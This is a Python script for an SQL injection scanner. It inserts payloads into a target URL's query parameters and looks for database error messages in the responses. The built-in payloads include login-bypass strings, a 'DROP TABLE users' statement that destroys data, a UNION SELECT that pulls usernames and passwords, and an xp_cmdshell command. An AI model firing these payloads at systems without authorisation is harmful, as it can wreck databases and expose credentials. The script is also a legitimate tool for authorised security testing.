import requests
import re
from urllib.parse import urlparse, parse_qs, urlencode
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class SQLInjectionScanner:
    def __init__(self, target_url, payloads_file="sql_payloads.txt"):
        self.target_url = target_url
        self.payloads = self.load_payloads(payloads_file)
        self.error_patterns = [
            r"sql syntax.*mysql",
            r"warning.*mysql",
            r"unclosed quotation mark after the character string",
            r"you have an error in your sql syntax",
            r"ora-\d{4,5}",
            r"sqlite.*error"
        ]

    def load_payloads(self, payloads_file):
        """Load SQL injection payloads from a file."""
        try:
            with open(payloads_file, 'r') as file:
                return [line.strip() for line in file if line.strip()]
        except FileNotFoundError:
            logger.error(f"Payloads file {payloads_file} not found. Using default payloads.")
            return [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "'; DROP TABLE users; --",
                "' UNION SELECT NULL, username, password FROM users --",
                "1; EXEC xp_cmdshell('dir') --"
            ]

    def parse_url_parameters(self):
        """Parse URL and extract parameters."""
        parsed_url = urlparse(self.target_url)
        query_params = parse_qs(parsed_url.query)
        return parsed_url, query_params

    def test_payload(self, url, param, payload):
        """Test a single payload against a parameter."""
        parsed_url, query_params = self.parse_url_parameters()
        query_params[param] = payload
        new_query = urlencode(query_params, doseq=True)
        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"

        try:
            response = requests.get(test_url, timeout=5)
            response_text = response.text.lower()

            for pattern in self.error_patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    logger.warning(f"Potential SQL Injection vulnerability found!")
                    logger.warning(f"URL: {test_url}")
                    logger.warning(f"Payload: {payload}")
                    logger.warning(f"Error pattern matched: {pattern}")
                    return True
            return False
        except requests.RequestException as e:
            logger.error(f"Error testing payload {payload}: {str(e)}")
            return False

    def scan(self):
        """Scan the target URL for SQL injection vulnerabilities."""
        logger.info(f"Starting SQL injection scan on {self.target_url}")
        parsed_url, query_params = self.parse_url_parameters()

        if not query_params:
            logger.info("No query parameters found in the URL")
            return False

        vulnerabilities_found = False
        for param in query_params:
            logger.info(f"Testing parameter: {param}")
            for payload in self.payloads:
                if self.test_payload(self.target_url, param, payload):
                    vulnerabilities_found = True

        if not vulnerabilities_found:
            logger.info("No SQL injection vulnerabilities found")
        return vulnerabilities_found

def main():
    # Example usage
    target_url = input("Enter the target URL to scan (e.g., http://example.com/page?param=value): ")
    scanner = SQLInjectionScanner(target_url)
    scanner.scan()

if __name__ == "__main__":
    main()